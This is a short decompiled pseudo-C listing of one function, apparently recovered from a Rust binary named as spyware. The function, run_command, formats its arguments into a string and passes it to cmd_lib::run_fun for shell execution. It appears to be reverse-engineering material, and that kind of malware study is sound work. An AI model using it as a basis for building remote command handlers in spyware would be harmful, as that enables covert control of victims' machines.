void spyware::actions::commands::run_command(unsigned long long a0, unsigned long long a1, unsigned long long a2)
{
    char v0;  // [bp-0x70]
    unsigned long long v1;  // [bp-0x68]
    unsigned long long v2;  // [bp-0x60]
    unsigned long long v3;  // [bp-0x58]
    unsigned long long v4;  // [bp-0x50]
    char *v5;  // [bp-0x48]
    unsigned long long v6;  // [bp-0x40]
    unsigned long long v7;  // [bp-0x38]
    unsigned long long v8;  // [bp-0x30]
    char *v9;  // [bp-0x28]
    unsigned long long v10;  // [bp-0x20]
    void* v11;  // [bp-0x18]

    v3 = a1;
    v4 = a2;
    v5 = &v3;
    v6 = <&T as core::fmt::Display>::fmt;
    v7 = &g_411890;
    v8 = 1;
    v11 = 0;
    v9 = &v5;
    v10 = 1;
    v0.map_or_else(&v7);
    cmd_lib::run_fun(a0, v1, v2);
    ::0x4593b0::core::ptr::drop_in_place<alloc::string::String>(&v0);
    return;
}
